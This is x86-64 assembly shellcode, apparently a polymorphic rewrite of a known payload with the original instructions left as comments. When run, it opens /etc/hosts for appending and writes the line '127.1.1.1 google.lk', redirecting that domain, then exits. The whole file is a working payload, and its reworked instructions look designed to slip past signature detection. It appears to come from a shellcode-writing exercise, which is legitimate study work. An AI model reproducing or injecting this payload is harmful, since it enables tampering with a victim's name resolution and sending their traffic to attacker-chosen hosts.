global _start
    section .text

_start:

	jmp real_start
	text db "127.1.1.1 google.lk"	; 19 bytes
	path db "/etc/hosts", 0x00	; 10 bytes
	
real_start:

    ;open
    ;xor rax, rax 
    ;add rax, 2  ; open syscall
	push 2
	pop rax

    ;xor rdi, rdi

	; As Rel Addressing is being used, all this code is not needed
    ;xor rsi, rsi
    ;push rsi ; 0x00 
    ;mov r8, 0x2f2f2f2f6374652f ; stsoh/
    ;mov r10, 0x7374736f682f2f2f ; /cte/
    ;push r10
    ;push r8
    ;add rdi, rsp
	; Instead the stack for the string, use rel addressing
	lea rdi, [rel path]

    xor rsi, rsi
    add si, 0x401
    syscall

    ;write
    ;xchg rax, rdi
	push rax
	pop rdi

    xor rax, rax

    ;add rax, 1 ; syscall for write
	inc rax

write:
	; JMP-CALL-POP code removed due Rel Addressing
	lea rsi, [rel text]

    ;mov dl, 19 ; length in rdx
	push 19
	pop rdx

    syscall

    ;close
    ;xor rax, rax
    ;add rax, 3
	push 3
	pop rax
    syscall

    ;exit
    ;xor rax, rax
    ;mov al, 60
	push 60
	pop rax

    xor rdi, rdi

    syscall 


